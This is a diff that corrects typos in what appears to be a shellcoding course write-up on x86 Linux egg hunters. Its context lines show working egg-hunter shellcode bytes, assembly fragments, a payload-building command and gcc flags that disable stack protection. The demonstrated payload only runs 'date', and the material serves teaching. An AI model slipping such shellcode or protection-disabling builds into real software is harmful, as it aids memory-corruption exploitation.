@@ -46,7 +46,7 @@ _start:
 $ echo $(python3 -c 'a=("\\x%0.2x" % 97);print(a*2500)')$(echo \\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50)$(bash ../get-shellcode.sh execve-date |cut -d\" -f 2)$(python3 -c 'a=("\\x%0.2x" % 97);print(a*2500)')
 ```
 
-The test program will be base on shellcode.c:
+The test program will be base on *shellcode.c*:
 
 ```c
 #include<stdio.h>
@@ -94,13 +94,13 @@ _start:
  jmp edx ;call final shellcode
 ```
 
-It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
+It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here).
 ```
 $ bash ../get-shellcode.sh access2
 "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
 ```
 
-After compilation, our final shellcode is immidiatly executed:
+After compilation, our final shellcode is immediately executed:
 
 ```
 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
@@ -139,13 +139,13 @@ next_page:
  jmp edi ;call final shellcode
 ```
 
-It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
+It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here).
 ```
 $ bash ../get-shellcode.sh access2revisited
 "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
 ```
 
-After compilation, our final shellcode is immidiatly executed:
+After compilation, our final shellcode is immediately executed:
 
 ```
 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
@@ -181,13 +181,13 @@ _start:
  jmp edi ;call final shellcode
 ```
 
-It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.
+It is extracted in order to be inserted into the *shellcode.c* file (as the file contents many a, it will not be displayed here.)
 ```
 $ bash ../get-shellcode.sh sigaction
 "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"
 ```
 
-After compilation, our final shellcode is immidiatly executed:
+After compilation, our final shellcode is immediately executed:
 
 ```
 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
